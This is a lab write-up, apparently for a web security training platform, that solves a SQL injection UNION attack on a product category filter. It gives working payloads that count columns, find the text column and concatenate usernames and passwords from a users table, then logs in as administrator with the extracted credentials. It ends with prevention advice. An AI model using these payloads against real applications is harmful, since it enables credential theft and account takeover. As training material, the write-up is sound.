# Lab 10: SQL injection UNION attack, retrieving multiple values in a single column

**Goal**: Perform a SQL injection UNION attack that retrieves all usernames and passwords concatenated into a single column, and use the credentials to log in as the `administrator` user.

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a `UNION` attack to retrieve data from other tables.

The database contains a `users` table with `username` and `password` columns. The database returns results in two columns, but only **one** column (the 2nd column) can hold text data. Therefore, you must concatenate multiple values (username and password) into a single column using a string concatenation operator.

---

## 🎯 Solution

1. Use Burp Suite to intercept and modify the product category filter request.
2. Determine the number of columns returned by the query using `ORDER BY`:
   ```sql
   '+ORDER+BY+2--
   ```
3. Determine which column contains text data using `UNION SELECT`:
   ```sql
   '+UNION+SELECT+NULL,'a'--
   ```
4. Concatenate `username` and `password` with a separator (e.g., `'~'`) using PostgreSQL string concatenation (`||` operator) to extract all credentials in a single text column:
   ```sql
   '+UNION+SELECT+NULL,username||'~'||password+FROM+users--
   ```
5. Extract the `administrator` password from the response and log in.

![Lab 10 Solution Summary](Pasted%20image%2020260907194935.png)

---

## 🛠️ Step-by-Step Guide

### Step 1: Find Column Count
Test using `ORDER BY` in the category filter parameter:
```http
/filter?category=Gifts'+ORDER+BY+1--  ✅
/filter?category=Gifts'+ORDER+BY+2--  ✅
/filter?category=Gifts'+ORDER+BY+3--  ❌ (Internal Server Error)
```

> [!NOTE]
> Receiving an internal server error at `ORDER BY 3` confirms that the query returns **2 columns**.

### Step 2: Identify Text-Compatible Columns
Test each column position to determine which accepts string/text data:

```http
/filter?category=Gifts'+UNION+SELECT+'a',NULL--   ❌ (Column 1 is not text)
/filter?category=Gifts'+UNION+SELECT+NULL,'a'--   ✅ (Column 2 accepts text)
```

> [!WARNING]
> Column 1 causes an error because it is a non-text type (e.g., integer). Column 2 is the **only text-compatible column**.

### Step 3: Concatenate Multiple Values into a Single Column
Since we need to retrieve both `username` and `password` but only have **one** text column available, use string concatenation to combine both fields into Column 2:

In PostgreSQL, string concatenation uses the `||` operator:
```http
/filter?category=Gifts'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```

#### Application Response Output:
```text
administrator~s3cur3p4ss
carlos~letmein
wiener~peter
```

#### Extracted Credentials:
| Username | Password |
|---|---|
| `administrator` | `s3cur3p4ss` |
| `carlos` | `letmein` |
| `wiener` | `peter` |

### Step 4: Login as Administrator
Navigate to `/login` and submit:
- **Username**: `administrator`
- **Password**: `s3cur3p4ss`

> [!SUCCESS]
> **Lab Solved**: Successfully authenticated as Administrator!

---

## 💡 Key Takeaways: String Concatenation Across Databases

When performing a `UNION` attack and facing a column count restriction where fewer text columns are available than fields to retrieve, field concatenation is essential. Different DBMS syntax:

| Database | Concatenation Syntax | Example |
|---|---|---|
| **PostgreSQL** | `||` | `'a' \|\| '~' \|\| 'b'` |
| **Oracle** | `||` | `'a' \|\| '~' \|\| 'b'` |
| **MySQL** | `CONCAT(str1, str2, ...)` | `CONCAT(a, '~', b)` |
| **Microsoft SQL Server** | `+` | `'a' + '~' + 'b'` |

### Summary Comparison:
```sql
-- FAILS: Attempting to select 2 text values when only 1 column supports text
UNION SELECT username, password FROM users  ❌

-- SUCCEEDS: Concatenating username and password into Column 2 with separator '~'
UNION SELECT NULL, username||'~'||password FROM users  ✅
```

---

## 🔒 Prevention

> [!TIP]
> 1. **Use Parameterized Queries (Prepared Statements)**:
>    ```php
>    $stmt = $pdo->prepare("SELECT * FROM products WHERE category = ?");
>    $stmt->execute([$category]);
>    ```
> 2. **Restrict Database Permissions**: Limit the application DB user to only necessary tables (least privilege).
> 3. **Input Validation**: Enforce strict allowlists on product categories or user-supplied filter parameters.